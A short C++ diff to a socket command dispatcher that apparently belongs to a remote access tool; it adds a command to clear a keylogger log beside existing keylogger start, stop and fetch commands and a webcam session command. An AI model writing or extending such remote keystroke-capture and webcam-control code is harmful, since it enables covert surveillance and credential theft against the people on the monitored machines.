@@ -102,6 +102,7 @@ std::string process(const std::string& line, SocketType client) {
     if (cmd == "KEYLOGGER_START") return keyloggerStartJson();
     if (cmd == "KEYLOGGER_STOP") return keyloggerStopJson();
     if (cmd == "KEYLOGGER_GET_LOG") return keyloggerGetLogJson();
+    if (cmd == "KEYLOGGER_CLEAR_LOG") return keyloggerClearLogJson();
 
     if (cmd == "WEBCAM_START") {
         return webcamStartSession(client);
